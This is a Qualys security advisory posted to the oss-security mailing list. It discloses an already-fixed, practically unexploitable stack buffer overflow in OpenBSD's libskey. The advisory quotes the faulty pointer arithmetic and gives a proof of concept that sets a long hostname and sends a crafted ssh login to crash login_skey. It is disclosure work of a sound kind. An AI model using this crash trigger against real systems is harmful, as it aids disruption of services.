Received: (qmail 29797 invoked by uid 550); 15 Mar 2023 23:13:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29756 invoked from network); 15 Mar 2023 23:13:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : content-id : content-transfer-encoding
 : mime-version; s=qualyscom;
 bh=xhCB8XXwdcno/+zXaiNJ33BedCFv3vjZs90RlvQOGfk=;
 b=FBIh94rjMR74wIrTGMjzxDdUIHuthN1d8EAdKIb7E9izx6e8jWoUJWqK0DxkUUk6gnQ+
 tA+eeN5xhu1YGhjofYP1Crt8qJS38RVRW0lF4IIS+eNeQV+DMpBQY+vaian2S12N6sPi
 U756CcoOVbriWoDXnSoqRDXe+qeLIbgfa/i96R72mCVO2Jc3/0w+WTW27tmRKIQeXvXn
 bQsfnbDdmwpzJ7uh2OkfiasNUvzZ49das7QoS5h5GLmkQ7+Z+cT+RiE8AKHTWGL3rtML
 pa7V7QP///bwGE6y3hzXxaO+9eOMqtJJ6f/9LVcxCkbcWinda2eBSZWoPjjPmeuoFCTB MA== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=cALucpG+EOySIjajJjTX8ha3o3l2oAEUfCiEt4t2M4N4hCtQyfodN3Bj8Sf1nJFabMYhrUb0A+uymBwLuyqosnYS1Lznb91an+CeeONNZn//EymMb4GdGLTxbSolXtAvpEcogzU5KsUa5XcYo8lMuvzMXZl9mk1D7Shl82RjtBFAi8JziwzGgGCDsFRpwC3yyrSZkn7vZb9mHPV19LIVg455REGcJEX2h8BTu/Y3K2m48AuV0fUEo3xp4999LdwdNc1perYfeBWeKblQMPw6G34yPOgWm+Y14bXRztCEFLoroAtWijdZkwQ3QVv6wOun67g+CNGKGEwwvLRsITFm6A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=xhCB8XXwdcno/+zXaiNJ33BedCFv3vjZs90RlvQOGfk=;
 b=XnouUsCYfC2Zr/zG3HX3YkzmtLVMdnWvVFgzBs9U8m6LecqcmBRsqaBVojY1M6fHGdTBCHIFnYwQE9yz2GG3NJCOEuVM7Jrw2xQf56KhbXQFdPynGhDP5bdHAlbDmde55gOcQeXgdnTRyXOjhX4AeBRQqPghRk0sSBCAhBV39TRSA6nxykOOyYqvOmHSKlJQiKxbSykcrZJFDrDIGMtsRCBe5HkCUJGFpNUnNnZh0M+SLxn+2w1CBkc9D2aIl+8lDk+L/AE5u0icCSyq/sM34vQLa/85l49uW28OeXYqRXlh1wW4/jd8y76tc9HSb3PjwhynukhQNLCPo4jkJcL8lQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=xhCB8XXwdcno/+zXaiNJ33BedCFv3vjZs90RlvQOGfk=;
 b=dwXZqhhdo98TPjTvKoJy5TTV7I8GXYRpREEwQFbfVQZhHqblBcYxFoEZCoZ4IbpIT71vxZ4+g8oA0GB7HykNBuPBMV+YH82WvKMvLmh1KFMqfohNoPG9a4Qj74G3U02ejo9clrmIXnzf+GkSjZBAXXP7yRH86srXxfoKxCMUkzo/iUOPZ9lbrZijG1ULur8YzmndQFKgFu+Aq+AKOQE3bupB8xKvJQhSiec6ntNhsKWkLArMlcq9Sf0mOlKKjuTZQGCvt4yT5AopbbogQ++ghXdgfwYeg2a//wGOMz7DsBCQ+DFtA4/3+QVRA8NgazlaNbkj5aV4bEXFlykS3B/6pA==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: Minor stack-based buffer overflow in OpenBSD's libskey
Thread-Index: AQHZV5O9PMG48EiJJ0mL1nq2YZFuLQ==
Date: Wed, 15 Mar 2023 23:13:23 +0000
Message-ID: <20230315231308.GA24066@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|CY4PR06MB2695:EE_
x-ms-office365-filtering-correlation-id: 38a8fd14-f8e7-4f04-dbdf-08db25aae027
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 9lvScBW1iUOzkFsBC9y228jUgrpvd4iMWM3EqllO/Gn0t+gmOMgKoeRCId7CmPvZHtsTXlpkeiRckWgViLJ/+S3Rs5s88sO5l6UvWrKNywrhILJYmHLkE0scCY8KZ4B1OaRfo570BsQKVaL67lZ+g2kvy0ty/+VtPbW25giH4+GGJHUn6V6viCgnTiQotTfmg3tGaHx+F5aKVATVnLd279hpgsfofPJO6+qzzgwo2mPAXMkuL04uCyCygQUJ+SLole0B+Y7aN4DNjA7dShmpmZsdNIl179crPr9QDDRi2aJQ3EM94Kqy8p4N4rfa6zs41CFfT2dAWom95W3QhhO2N9ydL9V6RG1SR9KogCgosNoZ8qRO+33S7yolZEnYptdihvl+XYLage8xitrLvS53OF3I1v8NfAMx45rSjNs9u43GwO8C1DfxrMR/CXAsQXAW24xQu12Xl8K2YKo2mPs4jMmd7NDzSQso+2KshSZJKlWwFwl/sclOEofAEs/aT7ERqb0AjerlBcXGvrEz1mVRZGvb3ltYom8SCe/R7e6sdXzyW9/ceC5kwVii90YCyTO5cghBn+6e6/VUK+Fd/XYORV2LpMm37onrddgxuHHcWQr8/WuXbfY8OrVIzq05BAgwy+5Rzxtvl5Z6W1+cQFJwVOkzNS+LcOEPTFyO2YpBbuCnOAVpqCgv3kbwljaPhQ5Y+taK+18o6s9Gz2G0/Ui1msB/tU+tEiRlqCgemgUtCiU=
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230025)(396003)(136003)(376002)(39860400002)(366004)(346002)(451199018)(38100700002)(86362001)(38070700005)(122000001)(33656002)(2906002)(41300700001)(5660300002)(8936002)(6506007)(6916009)(64756008)(6512007)(83380400001)(186003)(26005)(9686003)(55236004)(316002)(1076003)(66446008)(66476007)(66556008)(966005)(6486002)(91956017)(8676002)(76116006)(71200400001)(478600001)(66946007);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?SFqEsEMx42RsuLt0xAaKkztKhsyV2xho1ktYYAaRYhAQ1S7I4NO5DSbiaW4A?=
 =?us-ascii?Q?XUc6h/QkTGsb2ntMzrq/D9ALAM59JeHXgfpTEic8xyG/6ZsobYGcqKq+zrxX?=
 =?us-ascii?Q?z3xNp6S7fcClBMPRcEJXXO1Ao+eYbbtU7EbfZ9YOYTH9f02tLSS73ZEeNdV7?=
 =?us-ascii?Q?4b0IWIY0i6J8BM7+cWGtib9SLaoX86Jbb4Efnr8mdQS9+pdWVkTfWgHWblf6?=
 =?us-ascii?Q?GFGWZFW7qrPUh05oa96LX66lUJs2EyVlZaKf1LxnShgh+I3M8pnQZDwumMpA?=
 =?us-ascii?Q?nmN33s1YJpPpL/+OLAaqKZSPWT/lVPOWRPj0CKn7BNHcQV1pMaqxgQi2WHGF?=
 =?us-ascii?Q?fhhOyyI3g1HG/Of3r8hC7gelopI4JPMcYceUscCyfz/2jZSfj9TLOfi25vsb?=
 =?us-ascii?Q?YvzXnnfcL4rx1bgnXEbUM0HjyWrClOmcZ5pR7PLYV/fYmCekAsxtOL0+6pkf?=
 =?us-ascii?Q?1MtHNZuW8KpYCaG7ybdUoru7rWqZuiFsiq6cb852Rpc98tgwMcSStd/ZBmg8?=
 =?us-ascii?Q?8MxHvzywZOdKzRxZFfqEc2nfSyzVRH/gwNqZ930EWInU3JxxjK7tYE/Rw/t4?=
 =?us-ascii?Q?+YLSLF8mxF1hDAvN1TB/b6hVxnuSUgY7gyUXZKLGKiO6GDuebxcfBfp+knIv?=
 =?us-ascii?Q?FrrC7nXJcJxRVhFBneLXxbtSfIvcswAZVFaBypVditKu2ryhkt0kfz0Rdo5B?=
 =?us-ascii?Q?VE+BXL/6zpsSykk8QZM7qxNQ6H55uFPV6sT190zQ2Wc6modPmfegPoNqEd3J?=
 =?us-ascii?Q?7GJ326Y2YwgriBmv6gxrWV6h+GM55xaw+dLnfXMOcBhPSkY5OhEHVnbs0LqG?=
 =?us-ascii?Q?EXDUjJf3pHHUSIAAJVtzb3cd7APLQSg7noE9urFsBNVMUKI0CoLdkjn3rJtv?=
 =?us-ascii?Q?5QGd2F3yEO2yQgLQX0isxNAaZP1iBgQlR2lCr1Ok43Xw+kpPAfvLRhawGGbu?=
 =?us-ascii?Q?1A5tV1rEIncU5QEpwLTAScjuxo3bHxLaficdy2mxsEObiCBJCc++50EPMb3r?=
 =?us-ascii?Q?C62KDS9WpbG6ZGFpMu2BaJYTJWM8W5M3Tk4eIRAzmp27U2mNQDmtkR3P3o+Q?=
 =?us-ascii?Q?QWK/8XIHR1HUkSW+yUcZQeDuWtfCwbbLQ/pxSGPQqj3F01ReuYSFLUeWpa7Q?=
 =?us-ascii?Q?xUQFmGw1Jz13hgCopmEoil8BHJnSgIklOc+LxT7tU6gETF7JnCH3JArQx5e+?=
 =?us-ascii?Q?dwuSRyV+4NrDvR+lv8Rs2LT514EscP0YXKNNXn7loXzoMI7EOeYXltKvKr9N?=
 =?us-ascii?Q?LjUL+T6LZhEbRMS49dOPrlxz18rH9/Ffxbb4mtL+irqKSrPJ8VgGO9+GlhsG?=
 =?us-ascii?Q?dUgq/2pF36pqSoBAywItP9+w8bCPqgYy8zYLQU5zOhL3y3KUsH4dfCDaFgAB?=
 =?us-ascii?Q?/rwaedKRtj6f6cASBrxbV9nYyTPuxVMSoXhjgkCClzNfUE2SOkeOrzIK8yje?=
 =?us-ascii?Q?HB3qDWSZs2n93XHoaHMLYMuqG6Eh9KxxAc0m+1NJQKeQDAGzf/XGRJRo5V8d?=
 =?us-ascii?Q?8p/pe5jv27MX9RALp94TUgQt/+shWnurXFWquXwk4+3nrnsIPxcob0P68kOF?=
 =?us-ascii?Q?y0HrMId5j3OzqWHSTnwhKLTX+mm+ZGCY/gi3kuEWjH6wMIyb2/1iRf6YdFr0?=
 =?us-ascii?Q?1JvUclU7eDzcMWnBQwFGxxk=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <5FBBF4EAFDFAA34988B56B170F9E7642@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 38a8fd14-f8e7-4f04-dbdf-08db25aae027
X-MS-Exchange-CrossTenant-originalarrivaltime: 15 Mar 2023 23:13:23.7965
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: 69wXZmZwpheuEHh6FmrxeaubWleeWw8S8jC+hLWw+hRYl8Mv8zrBZPIi/FZ1EE8mWeZIPsQ1bzaCruxzkCX1m1LiLnfkJAAK7EiywPDWLNY=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CY4PR06MB2695
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.205,Aquarius:18.0.942,Hydra:6.0.573,FMLib:17.11.170.22
 definitions=2023-03-15_12,2023-03-15_01,2023-02-09_01
Subject: [oss-security] Minor stack-based buffer overflow in OpenBSD's libskey

Hi all,

(Posting this report here in case another project uses the same code.)

We discovered a minor stack-based buffer overflow in OpenBSD's libskey;
it was introduced in July 1997 by the following commit:

https://github.com/openbsd/src/commit/ea55ee16580e7b47c83712c5fd50615f8b1d2=
6ad

and was fixed today by the following commit (thanks to OpenBSD for their
incredibly quick response!):

https://github.com/openbsd/src/commit/848ef98a011b51fa811cb86fe900433edd2db=
24a

and although the vulnerable function is reachable remotely via OpenSSH,
this bug is useless in practice:

- the hostname of the affected system must be longer than 126 characters
  to trigger this buffer overflow;

- the characters that overflow this buffer are all '\0' characters (the
  filler characters of a strncpy() call).

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Analysis
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

For users who do not have an entry in the S/Key database (the default on
OpenBSD), libskey generates a fake challenge:

------------------------------------------------------------------------
 46 #define SKEY_MAX_PW_LEN         255
 ..
 49 #define SKEY_MAX_SEED_LEN       16
------------------------------------------------------------------------
420 skey_fakeprompt(char *username, char *skeyprompt)
421 {
422         char secret[SKEY_MAX_SEED_LEN], pbuf[SKEY_MAX_PW_LEN+1], *p, *u;
...
428         /*
429          * Base first 4 chars of seed on hostname.
430          * Add some filler for short hostnames if necessary.
431          */
432         if (gethostname(pbuf, sizeof(pbuf)) =3D=3D -1)
433                 *(p =3D pbuf) =3D '.';
434         else
435                 for (p =3D pbuf; isalnum((unsigned char)*p); p++)
436                         if (isalpha((unsigned char)*p) &&
437                             isupper((unsigned char)*p))
438                                 *p =3D (char)tolower((unsigned char)*p);
439         if (*p && pbuf - p < 4)
440                 (void)strncpy(p, "asjd", 4 - (pbuf - p));
------------------------------------------------------------------------

Unfortunately, "pbuf - p" at lines 439 and 440 should be "p - pbuf", so
the "pbuf - p < 4" test at line 439 always succeeds and the strncpy() at
line 440 may overflow pbuf (if 2 * (p - pbuf) + 4 > 255 + 1, i.e. if the
hostname is longer than 126 characters).

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Proof of concept
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

- First, as root on an OpenBSD system:

------------------------------------------------------------------------
# hostname=3D"`hostname`"

# hostname `perl -e 'print "a" x 136'`.my.domain

# ktrace -i /usr/sbin/sshd -d -p 2222
------------------------------------------------------------------------

- Second, as a remote attacker:

------------------------------------------------------------------------
$ ssh -o ChallengeResponseAuthentication=3Dyes -o KbdInteractiveAuthenticat=
ion=3Dyes -o PreferredAuthentications=3Dkeyboard-interactive -o KbdInteract=
iveDevices=3Dbsdauth -l nobody:skey -p 2222 192.168.56.123
------------------------------------------------------------------------

- Third, again as root on the OpenBSD system:

------------------------------------------------------------------------
# hostname "$hostname"

# kdump
...
6718 login_skey PSIG  SIGSEGV SIG_DFL code SEGV_MAPERR<1> addr=3D0x7f7f0000=
0000 trapno=3D6
------------------------------------------------------------------------

We are at your disposal for questions, comments, and further
discussions. Thank you very much!

With best regards,

--=20
the Qualys Security Advisory team=
